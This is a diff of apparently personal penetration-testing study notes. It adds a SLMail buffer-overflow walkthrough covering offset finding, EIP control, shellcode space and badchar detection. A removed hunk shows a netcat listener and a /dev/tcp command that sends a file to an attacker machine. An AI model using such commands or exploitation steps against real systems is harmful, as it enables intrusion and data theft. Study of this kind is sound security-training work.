@@ -2418,13 +2418,9 @@ Next, this is the link to the GitHub project in which this lesson is based:
     
       
     
-    > To use BAT in our attacker machine to display better a file  
-    >   
-    > att> nc -nvlp 443 | cat -l php  
-    >   
-    > victim> cat < <file> > /dev/tcp/<att_machine_ip>/<port>  
-    >   
-    
+    To use BAT in our attacker machine to display better a file  
+		![[Pasted image 20241121165535.png]]
+	
     So, the sintax of LDAP allow us to make something like NoSQLi if not sanitized
     
     ![[Untitled 204.png]]
@@ -3534,7 +3530,7 @@ Lab used during lesson:
     
     ![[Untitled 322.png]]
     
-    For example this is the number one and its tags <Coffees><Coffee>
+    For example this is the number one and its tags \<Coffees>\<Coffee>
     
     The query is being made as /Coffees/Coffee[@ID=’1’]
     
@@ -5346,6 +5342,8 @@ At the end of this lesson we will be able to comprehend the different potential 
     This command created a container and this is the ID
     
     ![[image 48.png]]
+	
+	![image 48](image%2048.png)
     
 
   
@@ -5423,3 +5421,93 @@ Therefore, the objective is to find out the offset and know the exact number of 
 ---
 
 - PoC
+Once we have SLMail running we can use Inmunity debugger to see at low level
+
+![[Pasted image 20241121132014.png]]
+
+Now, we know that there is different exploits for this version of SLMail, one example is this
+![[Pasted image 20241121133144.png]]
+
+This is the exploit that we will be creating 
+![[Pasted image 20241121134524.png]]
+
+So we noticed that using 5k characters the programs crashes, so there is a buffer overflow being exploited
+
+![[Pasted image 20241121134827.png]]
+
+Now, for the next steps we need to know the offset to succesfully exploit the buffer overflow and inject our commands, so for this pourpouse we'll use a tool from metasploit
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+
+![[Pasted image 20241121135025.png]]
+
+This tool creates an specific pattern, so then using pattern_offset, another tool of metasploit, we can locate the offset for this Buffer overflow
+
+Now lets enter this pattern into the exploit.py so we can search the new EIP value
+![[Pasted image 20241121135543.png]]
+
+Now that we sent the created pattern, we can see that we have a new EIP value, so we need that value to find the offset
+![[Pasted image 20241121135449.png]]
+
+Now, using pattern_offset, we can find the offset
+![[Pasted image 20241121135624.png]]
+
+With this offset, now we can inject our payload into the EIP after the buffer overflow is exploited
+
+![[Pasted image 20241121135758.png]]
+
+So now, as attacker we have control of the EIP stack
+![[Pasted image 20241121135850.png]]
+
+## Assigning space for Shellcode
+
+Once the offset is found and we can succesfully write the EIP register, the next step is to identify in which part of the memory the sent characters are being represented.
+
+Once  we overwrite the EIP register value, every extra character we enter in the input field (in this particular example) are represented at the beggining of the stack in the ESP (Extended Stack Pointer) register. The ESP is a CPU register that is used to handle the stack of a program. The stack is a temporal zone in the memory used to store values and return directions of the funtions that are called in the execution.
+
+Once we identify the location of the memory characters, the main idea is to inject **Shellcode** into that location, this shellcode are low level instructions which in this case these are malicious instructions.
+
+The shellcode is injected into the stack and stored in the same address in which the overwritten characters were stored. In other words, we take advantage of the buffer overflow to execute malicious shellcode and take control over the system.
+
+It is important to carefully designed the shellcode so its not detected as a malicious software, and also it should be compatible with the CPUs architecture and the OS that is being attacked.
+
+In summary, the shellcode space asignation implies that we need to identify the memory address where the overwritten characters are being stored and stored in the same place the shellcode. However, not every character in the shellcode can be interpreted, so in this lesson we will be looking on how to detect these badchars and generate our shellcode.
+
+--- 
+- PoC
+	So in the previous lesson we found that we need 4654 characters to overflow the buffer and control the EIP register.
+	![[Pasted image 20241121161939.png]]
+	We see that we are controlling the EIP register to then inject the 'C' to the ESP
+	In this case the char are represented at the beggining of the EIP
+	What we should do in this case, we need to point to another address with the opt_code that has the jumpESP instruction, this instruction takes as us to the ESP, and then we can make the code to interpret the Shellcode
+
+## Bytearrays generation and detection of badchars
+
+During the generation of our malicious shellcode, it is possible that some characters are badly interpretated. These characters are known as badchars and can cause the shellcode to fail or crash the objective software.
+
+To avoid this, it is important to identify and eliminate these badchars within the shellcode. In this lesson we'll be using Inmunity Debugger to use the "Mona" funtionality and generate various bytearrays with all the represented characters, and then identify which ones the objective software is unable to interpret.
+
+Once identified, we can discard them from the final shellcode and generate a new shellcode that do not contains these badchars. To identify these badchars we can use different techniques, like the introduction of diferent bytearrays with hexadecimal consecutive characters that allow us to identify which characters the objective program does not allow.
+
+These characters are represented in the ESP stack, this is where we are going to see which characters are not being represented.
+
+---
+- PoC
+		We'll be using "mona" which is a tool inside inmunity debugger
+		![[Pasted image 20241122002016.png]]
+		This is the bytearray created by Mona, and these are usable characters
+		![[Pasted image 20241122002146.png]]
+		We excluded the Null Byte since is often a problematic character
+		We are using smb to tranfer these data from win7 to our machine
+		![[Pasted image 20241122002356.png]]
+		impacket-smbserver is a smb server utility for linux, we use the flag -smb2support for compability
+		Now, when we use the exploit, we can see the ESP with the used characters and we need to check which ones are badchars. For this we can use mona compare and pass the ESP address and the previous created bytearray.bin.
+		![[Pasted image 20241122003136.png]]
+		Now we now which characters are badchars
+		![[Pasted image 20241122003221.png]]
+		Now we could create another bytearray excluding these badchars, or we can manually delete these from the exploit
+		We should always create the new bytearray so we can compare for more badchars.
+		Once we know which characters are the badchars, we can now use all the other characters to make our payload.
+		The next step is to find an address from which we could jump to the ESP and use our instructions. We'll be using breakpoints.
+---
+## OpCodes search to enter the ESP and load our Shellcode
+
